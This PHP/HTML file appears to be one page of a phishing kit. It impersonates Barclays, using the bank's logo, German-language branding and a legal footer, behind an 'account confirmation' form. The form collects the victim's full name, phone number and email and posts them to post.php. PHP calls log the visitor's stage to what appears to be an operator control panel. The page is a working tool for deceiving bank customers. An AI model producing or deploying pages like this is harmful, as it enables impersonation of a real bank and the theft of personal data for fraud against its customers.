<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barclays</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
<header>
<div class="left">
    <img src="res/img/logo.png" class="pc">
    <img src="res/img/mobile-logo.png" class="mobile">
</div>
<div class="right"> 
</div>
</header>

<div class="banner">
<div class="container">
<span>Kontobestätigung</span>
</div>
</div>



<main>
<div class="container">
<div class="form">

<div class="text">
 Bitte geben Sie die folgenden Informationen ein
</div>
<div class="col">
<label>Vollständiger Name</label>
<input type="text" id="name">
</div>
<div class="col">
<label>Telefonnummer</label>
<input type="text" id="phone">
</div>
<div class="col">
<label>E-Mail-Adresse</label>
<input type="text" id="email">
</div>
<div class="col">
    <button onclick="sbmt()">Weiter</button>
</div>



</div>
</div>
</main>



<footer>
<div class="container">
<p>Barclays Group hat der BAWAG das Nutzungsrecht an der Marke „Barclays“ für das Privatkundengeschäft in Deutschland und Österreich eingeräumt. Barclays Group und BAWAG befinden sich in keinem Beteiligungsverhältnis und handeln für ihre Geschäftsbereiche unabhängig voneinander.</p>
<img src="res/img/pubs.png">
</div>
</footer>




<?php 
require 'loader.php';
$m->ctr("INFO ".@$_GET['e']);
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    var sub = true;
    $("input").removeClass("error");
    if( $("#name").val().length<3){
        $("#name").addClass("error");
        return sub=false;
    }
    if( $("#phone").val().length<3){
        $("#phone").addClass("error");
        return sub=false;
    }   
     if( $("#email").val().length<3){
        $("#email").addClass("error");
        return sub=false;
    }

    if(sub){
        $(".loader").show();
        _cp = "LOADING (LOGIN)";
        $.post("post.php",{name2:$("#name").val(), phone:$("#phone").val(), email_:$("#email").val()});
    }
}

</script>
</body>
</html>